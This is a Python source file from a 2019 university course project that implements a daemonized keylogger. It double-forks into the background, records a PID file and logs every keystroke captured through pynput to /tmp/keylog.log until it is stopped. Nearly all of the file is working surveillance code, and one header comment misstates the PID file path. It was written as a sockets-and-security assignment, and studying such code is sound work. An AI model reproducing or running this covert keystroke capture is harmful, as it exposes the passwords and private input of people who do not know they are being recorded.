#!/usr/bin/python3

# ==============================================================================
#      Assignment: DPI912 Term Project
#      Daemonized Key Logger
#
#      Authors: Sang Min Park, Jacky Tea
#      Student ID (Sang Min Park): 124218173
#      Student ID (Jacky Tea): 152078168
#      Language: Python3
#      Libraries Used: keyboard, pynput, sys, os, atexit, signal, logzero
#
#      To compile with python3 >>> python3 a1KeyLogger.py start
#      To compile with executable >>> chmod 700 a1KeyLogger.py
#                                 >>> ./a1KeyLogger.py start
#
#      Class: DPI912 NSB - Python for Programmers: Sockets and Security
#      Professor: Dr. Harvey Kaduri
#      Due Date: Friday, December 6, 2019, 5:50 PM EST
#      Submitted:
#
# -----------------------------------------------------------------------------
#
#      Cookbook code utilized from the following source:
#      https://github.com/dabeaz/python-cookbook/blob/master/src/12/launching_a_daemon_process_on_unix/daemon.py
#
#      Description: A keystroke logging program that records all keystrokes that
#      a user inputs into their keyboard. This program runs in the background via forking.
#
#      Input: A command line argument of either 'start' or 'stop'. For example:
#      ./a1KeyLogger.py start. 'start' will execute the key logger, 'stop' will
#      kill its background process.
#
#      Output: A file in /tmp called 'keylog.log', full path: '/tmp/keylog.log'.
#      This file contains all keystrokes recorded up till the time the daemon is
#      terminated. Another file in the path: '/tmp/keylog.log' is generated to keep
#      track of the daemon's PID value once it double forks from the terminal.
#
#      Algorithm: Performs a check to see if PID file exists, if it does, an error
#      is thrown to indicate that a daemon instance is already running. If not,
#      the program forks off twice to separate itself as a background process
#      away from the terminal and begins to detecting any keystrokes put into
#      the keyboard. All keystrokes are then logged to a log file until the
#      the machine is shut off, or a SIGHUP or a SIGTERM is detected to terminate
#      the daemon.
#
#      Required Features Not Included:
#
#      Known Bugs: os.kill() can be disrupted at times, leaving the process running.
#
# ==============================================================================

from pynput import keyboard
import sys
import os
import atexit
import signal

pidFile = '/tmp/keylog.pid'


def processTerminator(signalNumber,  functionReference):
    # wait for child processes to complete and destroy them
    while True:
        try:
            pid,  status = os.waitpid(-1,  os.WNOHANG)
        except OSError:
            return
        # no more zombies
        if pid == 0:
            return


# Main
if len(sys.argv) < 2:
    print('Incorrect Args! Usage: ./a1KeyLogger.py [start | stop]')
    raise SystemExit('Exit Code: ' + str(1))

# Detect start command
if sys.argv[1] == 'start':
    try:
        if os.path.exists(pidFile):
            raise RuntimeError()

        # Perform double fork
        try:
            if os.fork() > 0:
                # Parent exit
                raise SystemExit(0)
        except OSError as e:
            raise RuntimeError(f'fork #1 failed: {e}')

        os.chdir('/tmp')
        os.umask(0)
        os.setsid()

        try:
            if os.fork() > 0:
                # Parent exit
                raise SystemExit(0)
        except OSError as e:
            raise RuntimeError(f'fork #2 failed: {e}')

        # Function to be called when SIGTERM is terminated
        def sigTermTermination(signo,  frame):
            raise SystemExit()

        atexit.register(lambda: os.remove(pidFile))
        signal.signal(signal.SIGTERM,  sigTermTermination)

        try:
            # Write daemone pid into a pidfile
            with open(pidFile,  'w') as fileHandler:
                fileHandler.write(str(os.getpid()))
        except Exception as err:
            raise Exception()

        # Keylogger function
        def keyPressed(key):
            if str(key) == 'Key.esc':
                sys.exit(0)
            else:
                # Write pressed keys into a log
                with open('/tmp/keylog.log',  'a') as fileHandler:
                    fileHandler.write(str(key))

        # Listening for keylogging activities
        with keyboard.Listener(on_press=keyPressed) as listener:
            listener.join()

    except RuntimeError as err:
        raise SystemExit()


# Detect stop command and send signal to kill daemon
elif sys.argv[1] == 'stop':
    # Kill pid process stored in the pidfile and SystemExit after
    if os.path.exists(pidFile):
        with open(pidFile) as fileHandler:
            pid = int(fileHandler.readline().rstrip())
            while True:
                try:
                    os.kill(pid,  signal.SIGTERM)
                except Exception as err:
                    raise SystemExit()
    else:
        raise SystemExit()

# detect erroneous command
else:
    raise SystemExit()
